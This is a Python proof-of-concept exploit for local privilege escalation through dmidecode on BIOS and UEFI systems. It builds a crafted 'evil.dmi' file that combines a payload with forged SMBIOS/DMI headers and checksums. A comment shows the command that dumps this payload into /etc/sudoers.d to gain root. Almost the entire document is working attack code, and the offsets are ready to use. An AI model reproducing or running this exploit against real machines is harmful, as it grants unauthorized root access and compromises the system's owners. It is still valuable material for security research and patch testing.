# Proof of concept - Privilege escalation using dmidecode on BIOS and UEFI systems.
#
# Author: born0monday
# 
# DMI file structure:
# - Payload
# - Padding
# - SM and DMI headers
# - Padding
# 
# UEFI mode:
# If the system is using UEFI make sure to use the
# corresponding config and set OFFSET according to 
# dmidecode output:
# 
# $ dmidecode --no-sysfs -d evil.dmi --dump-bin /etc/sudoers.d/pwn
# dmidecode 3.4
# SMBIOS entry point at 0x0efc2000

import sys

# defaults
HEADER_LEN = 31

# bios
OFFSET = 0xf0000
END_PAD = 0x10000

# uefi
#OFFSET = 0x0efc2000
#END_PAD = 0x00

def main():
    if len(sys.argv) < 3:
        print("Usage:", sys.argv[0], "payload evil.dmi")
        sys.exit(1)

    payload_path = sys.argv[1]
    out_path = sys.argv[2]

    print("Using offset:", hex(OFFSET))
    print("Using end padding size:", hex(END_PAD))
        
    with open(payload_path, "rb") as _f:
        payload = _f.read()
    
    payload_len = len(payload)
    print("Read", payload_len, "bytes from payload file", payload_path)
    
    sm = [0x00] * 16
    sm[0x00] = 0x5f # _
    sm[0x01] = 0x53 # S
    sm[0x02] = 0x4d # M
    sm[0x03] = 0x5f # _
    sm[0x04] = 0x00
    sm[0x05] = HEADER_LEN
    sm[0x06] = 0x02 # version major
    sm[0x07] = 0x01 # version minor
    
    bp_length = payload_len.to_bytes(2, byteorder="little")
    
    dmi = [0x00] * 16
    dmi[0x00] = 0x5f # _
    dmi[0x01] = 0x44 # D
    dmi[0x02] = 0x4d # M
    dmi[0x03] = 0x49 # I
    dmi[0x04] = 0x5f # _
    dmi[0x06] = bp_length[0] # payload length
    dmi[0x07] = bp_length[1]
    dmi[0x0c] = 0x01 # num structures
    
    # dmi checksum
    dmi[0x0e] = 256 - (sum(dmi[:14]) % 256)
    
    dmi_payload = sm + dmi
    # full checksum
    dmi_payload[0x0f] = 256 - (sum(dmi_payload[:HEADER_LEN]) % 256)
    
    print("SM: ", " ".join("{:02X}".format(b) for b in dmi_payload[:16]))
    print("DMI:", " ".join("{:02X}".format(b) for b in dmi_payload[16:]))
    
    start_pad_len = OFFSET - payload_len

    buf = b""
    buf += payload
    buf += start_pad_len * b"\x00"
    buf += bytearray(dmi_payload)
    buf += END_PAD * b"\x00"
    
    print("Writing", len(buf), "bytes to", out_path)
    with open(out_path, "wb") as _f:
        _f.write(buf)

    print("Done!")


if __name__ == "__main__":
    main()
